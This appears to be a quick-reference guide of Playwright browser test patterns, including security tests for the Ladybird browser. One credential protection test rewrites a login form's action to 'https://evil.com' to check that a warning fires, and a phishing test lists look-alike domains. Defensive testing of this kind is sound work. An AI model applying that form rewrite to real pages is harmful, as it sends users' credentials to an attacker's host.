# Test Patterns Quick Reference

Common test patterns for Playwright automation.

## Basic Patterns

### 1. Navigate and Assert
```javascript
await mcp__playwright__browser_navigate({ url: "..." });
await mcp__playwright__browser_wait_for({ text: "Expected" });
const snapshot = await mcp__playwright__browser_snapshot({});
assert(snapshot.includes("Expected content"));
```

### 2. Fill Form and Submit
```javascript
await mcp__playwright__browser_fill_form({
  fields: [
    { name: "Field", type: "textbox", ref: "input", value: "value" }
  ]
});
await mcp__playwright__browser_click({
  element: "Submit",
  ref: "button[type='submit']"
});
await mcp__playwright__browser_wait_for({ text: "Success" });
```

### 3. Click and Verify
```javascript
await mcp__playwright__browser_click({
  element: "Button",
  ref: "button#action"
});
await mcp__playwright__browser_wait_for({ text: "Result" });
const snapshot = await mcp__playwright__browser_snapshot({});
assert(snapshot.includes("Expected result"));
```

## Advanced Patterns

### 4. Multi-Step Workflow
```javascript
// Step 1: Login
await fillLoginForm(username, password);
await submitForm();
await waitForDashboard();

// Step 2: Navigate to feature
await navigateToPage("/feature");
await waitForPageLoad();

// Step 3: Perform action
await performAction();
await verifyResult();
```

### 5. Error Handling with Retry
```javascript
let attempts = 0;
const maxAttempts = 3;

while (attempts < maxAttempts) {
  try {
    await performAction();
    break; // Success
  } catch (error) {
    attempts++;
    if (attempts === maxAttempts) throw error;
    await mcp__playwright__browser_wait_for({ time: 1 });
  }
}
```

### 6. Conditional Logic
```javascript
const snapshot = await mcp__playwright__browser_snapshot({});

if (snapshot.includes("Login")) {
  // Not logged in, perform login
  await login();
} else if (snapshot.includes("Dashboard")) {
  // Already logged in, continue
  await navigateToFeature();
}
```

## Testing Patterns

### 7. Visual Regression Test
```javascript
// Navigate to page
await mcp__playwright__browser_navigate({ url: "..." });

// Wait for stability
await mcp__playwright__browser_wait_for({ time: 1 });

// Capture screenshot
await mcp__playwright__browser_take_screenshot({
  fullPage: true,
  filename: "current.png"
});

// Compare with baseline
const diff = await compareWithBaseline("current.png", "baseline.png");
assert(diff.pixelDifference < 0.1);
```

### 8. Accessibility Test
```javascript
const snapshot = await mcp__playwright__browser_snapshot({});

// Check for violations
const violations = [];

if (snapshot.match(/<img[^>]*(?!alt=)/)) {
  violations.push("Images without alt text");
}

if (snapshot.match(/<button[^>]*>\s*<\/button>/)) {
  violations.push("Buttons without labels");
}

assert(violations.length === 0, violations.join(", "));
```

### 9. Keyboard Navigation Test
```javascript
// Tab through focusable elements
await mcp__playwright__browser_press_key({ key: "Tab" });
await mcp__playwright__browser_press_key({ key: "Tab" });

// Activate focused element
await mcp__playwright__browser_press_key({ key: "Enter" });

// Verify navigation worked
const snapshot = await mcp__playwright__browser_snapshot({});
assert(snapshot.includes("Expected result"));
```

### 10. Network Monitoring Test
```javascript
// Perform action that triggers requests
await mcp__playwright__browser_click({
  element: "Load Data",
  ref: "button#load"
});

// Wait for requests
await mcp__playwright__browser_wait_for({ time: 2 });

// Verify requests
const requests = await mcp__playwright__browser_network_requests({});
const apiCall = requests.find(r => r.url.includes("/api/data"));
assert(apiCall, "API request not made");
assert(apiCall.status === 200, "API request failed");
```

## Multi-Tab Patterns

### 11. Open New Tab and Switch
```javascript
// Create new tab
await mcp__playwright__browser_tabs({ action: "new" });

// Navigate in new tab
await mcp__playwright__browser_navigate({ url: "..." });

// Work in new tab
await performActions();

// Switch back to original tab
await mcp__playwright__browser_tabs({ action: "select", index: 0 });
```

### 12. Tab Isolation Test
```javascript
// Tab 1: Set value
await mcp__playwright__browser_evaluate({
  function: "() => { window.testValue = 'tab1'; }"
});

// Tab 2: Check isolation
await mcp__playwright__browser_tabs({ action: "new" });
const value = await mcp__playwright__browser_evaluate({
  function: "() => typeof window.testValue"
});

assert(value === "undefined", "Tabs not isolated");
```

## Ladybird-Specific Patterns

### 13. Fingerprinting Detection Test
```javascript
// Load fingerprinting test page
await mcp__playwright__browser_navigate({
  url: "file:///path/to/fingerprint-test.html"
});

// Wait for detection
await mcp__playwright__browser_wait_for({ time: 2 });

// Check for detection alert
const snapshot = await mcp__playwright__browser_snapshot({});
assert(
  snapshot.includes("Fingerprinting detected"),
  "Detection not triggered"
);
```

### 14. Credential Protection Test
```javascript
// Fill credentials
await mcp__playwright__browser_fill_form({
  fields: [
    { name: "Username", type: "textbox", ref: "input[name='user']", value: "test" },
    { name: "Password", type: "textbox", ref: "input[name='pass']", value: "pass" }
  ]
});

// Modify form to cross-origin
await mcp__playwright__browser_evaluate({
  function: "() => { document.querySelector('form').action = 'https://evil.com'; }"
});

// Submit and check protection
await mcp__playwright__browser_click({
  element: "Submit",
  ref: "button[type='submit']"
});

const snapshot = await mcp__playwright__browser_snapshot({});
assert(snapshot.includes("Security Warning"), "Protection not triggered");
```

### 15. Phishing Detection Test
```javascript
const phishingURLs = [
  "https://paypal-secure.com",
  "https://google-login.xyz"
];

for (const url of phishingURLs) {
  await mcp__playwright__browser_navigate({ url });
  await mcp__playwright__browser_wait_for({ time: 2 });

  const snapshot = await mcp__playwright__browser_snapshot({});
  assert(
    snapshot.includes("Phishing") || snapshot.includes("Warning"),
    `Phishing not detected for ${url}`
  );
}
```

## Debugging Patterns

### 16. Progressive Screenshots
```javascript
let step = 0;

try {
  await action1();
  await mcp__playwright__browser_take_screenshot({
    filename: `step-${++step}.png`
  });

  await action2();
  await mcp__playwright__browser_take_screenshot({
    filename: `step-${++step}.png`
  });

  await action3();
  await mcp__playwright__browser_take_screenshot({
    filename: `step-${++step}.png`
  });
} catch (error) {
  await mcp__playwright__browser_take_screenshot({
    filename: `FAILURE-step-${step}.png`
  });
  throw error;
}
```

### 17. Comprehensive Debug Info
```javascript
async function captureDebugInfo() {
  const snapshot = await mcp__playwright__browser_snapshot({});
  const consoleErrors = await mcp__playwright__browser_console_messages({
    onlyErrors: true
  });
  const requests = await mcp__playwright__browser_network_requests({});
  await mcp__playwright__browser_take_screenshot({
    filename: "debug.png"
  });

  return {
    snapshot,
    consoleErrors,
    networkRequests: requests.length,
    failedRequests: requests.filter(r => r.status >= 400).length
  };
}
```

### 18. Slow Motion Execution
```javascript
// Add delays for visual debugging
async function slowAction(fn, description) {
  console.log(`  ${description}...`);
  await fn();
  await mcp__playwright__browser_wait_for({ time: 1 });
  await mcp__playwright__browser_take_screenshot({
    filename: `${description}.png`
  });
}

await slowAction(
  () => mcp__playwright__browser_click({ element: "Button", ref: "button" }),
  "Click button"
);
```

## Performance Patterns

### 19. Load Time Measurement
```javascript
const startTime = Date.now();

await mcp__playwright__browser_navigate({ url: "..." });
await mcp__playwright__browser_wait_for({ text: "Loaded" });

const loadTime = Date.now() - startTime;
assert(loadTime < 3000, `Page load too slow: ${loadTime}ms`);
```

### 20. Network Efficiency Test
```javascript
await mcp__playwright__browser_navigate({ url: "..." });
await mcp__playwright__browser_wait_for({ time: 2 });

const requests = await mcp__playwright__browser_network_requests({});

const analysis = {
  total: requests.length,
  http: requests.filter(r => r.url.startsWith("http:")).length,
  https: requests.filter(r => r.url.startsWith("https:")).length
};

assert(analysis.http === 0, "Insecure HTTP requests detected");
```

## Assertion Patterns

### 21. Snapshot Assertions
```javascript
const snapshot = await mcp__playwright__browser_snapshot({});

assert(snapshot.includes("text"), "Expected text not found");
assert(!snapshot.includes("error"), "Error text found");
assert(snapshot.match(/pattern/), "Pattern not matched");
```

### 22. Console Assertions
```javascript
const errors = await mcp__playwright__browser_console_messages({
  onlyErrors: true
});

assert(errors.length === 0, `Console errors: ${errors.join(", ")}`);
```

### 23. Network Assertions
```javascript
const requests = await mcp__playwright__browser_network_requests({});

const apiCall = requests.find(r => r.url.includes("/api"));
assert(apiCall, "API call not made");
assert(apiCall.status === 200, "API call failed");
```

## Setup/Teardown Patterns

### 24. Test Fixture Pattern
```javascript
class TestFixture {
  async setup() {
    await mcp__playwright__browser_navigate({ url: baseURL });
    await this.login();
  }

  async teardown() {
    await this.logout();
    await mcp__playwright__browser_tabs({ action: "close" });
  }

  async login() { /* ... */ }
  async logout() { /* ... */ }
}

// Usage
const fixture = new TestFixture();
await fixture.setup();
// ... run tests
await fixture.teardown();
```

### 25. Page Object Pattern
```javascript
class LoginPage {
  constructor() {
    this.selectors = {
      username: "input[name='username']",
      password: "input[name='password']",
      submit: "button[type='submit']"
    };
  }

  async login(username, password) {
    await mcp__playwright__browser_type({
      element: "Username",
      ref: this.selectors.username,
      text: username
    });
    await mcp__playwright__browser_type({
      element: "Password",
      ref: this.selectors.password,
      text: password
    });
    await mcp__playwright__browser_click({
      element: "Submit",
      ref: this.selectors.submit
    });
  }
}

// Usage
const loginPage = new LoginPage();
await loginPage.login("user", "pass");
```

## Quick Reference Card

| Pattern | Use When |
|---------|----------|
| Navigate and Assert | Testing page load and content |
| Fill Form and Submit | Testing form interactions |
| Multi-Step Workflow | Testing user journeys |
| Visual Regression | Detecting UI changes |
| Accessibility Test | Ensuring WCAG compliance |
| Keyboard Navigation | Testing keyboard users |
| Network Monitoring | Testing API calls |
| Multi-Tab Test | Testing tab isolation |
| Progressive Screenshots | Debugging failures |
| Load Time Measurement | Performance testing |
| Test Fixture | Reusing setup/teardown |
| Page Object | Organizing selectors |

## Anti-Patterns (Avoid)

### ❌ Arbitrary Waits
```javascript
// BAD
await mcp__playwright__browser_wait_for({ time: 5 });

// GOOD
await mcp__playwright__browser_wait_for({ text: "Loaded" });
```

### ❌ Hardcoded Selectors
```javascript
// BAD
await mcp__playwright__browser_click({
  element: "Button",
  ref: "body > div:nth-child(3) > button"
});

// GOOD
await mcp__playwright__browser_click({
  element: "Submit button",
  ref: "button[data-testid='submit']"
});
```

### ❌ No Error Handling
```javascript
// BAD
await performAction();

// GOOD
try {
  await performAction();
} catch (error) {
  await captureDebugInfo();
  throw error;
}
```

### ❌ Test Dependencies
```javascript
// BAD
async function testB() {
  // Assumes testA ran first
  await continueFromTestA();
}

// GOOD
async function testB() {
  await setup(); // Independent setup
  await performTestB();
}
```
